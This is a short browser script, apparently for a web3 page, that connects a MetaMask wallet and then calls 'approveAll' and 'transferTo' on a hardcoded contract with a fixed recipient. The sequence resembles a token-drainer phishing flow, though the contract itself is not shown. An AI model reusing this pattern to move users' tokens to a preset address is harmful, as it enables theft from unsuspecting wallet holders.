const ethers = window.ethers;

let provider;
let signer;
let userAddress = null;

const contractABI = [
  {
    "inputs": [],
    "name": "approveAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "transferTo",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_tokenAddress",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "token",
    "outputs": [
      {
        "internalType": "contract IERC20",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

const contractAddress = "0x8B801270f3e02eA2AACCf134333D5E5A019eFf42";
let contract;

// 连接钱包
async function connectWallet() {
  if (window.ethereum) {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    try {
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      userAddress = await signer.getAddress();
      document.getElementById("walletAddress").innerText = `Connected: ${userAddress}`;
      
      // 合约实例化
      contract = new ethers.Contract(contractAddress, contractABI, signer);
      
      document.getElementById("authorize").disabled = false;
    } catch (error) {
      console.error("User denied account access", error);
    }
  } else {
    alert('Please install MetaMask!');
  }
}

// 授权代币转移
async function authorizeTokens() {
  try {
    const tx = await contract.approveAll(); // 调用 approveAll 函数
    await tx.wait();
    console.log("Tokens approved successfully:", tx);
    document.getElementById('transfer').disabled = false;
  } catch (error) {
    console.error("Error during authorization:", error);
  }
}

// 转移代币
async function transferTokens() {
  try {
    const tx = await contract.transferTo(); // 调用 transferTo 函数
    await tx.wait();
    console.log("Tokens transferred successfully:", tx);
  } catch (error) {
    console.error("Error during token transfer:", error);
  }
}

document.getElementById('connectWallet').addEventListener('click', connectWallet);
document.getElementById('authorize').addEventListener('click', authorizeTokens);
document.getElementById('transfer').addEventListener('click', transferTokens);
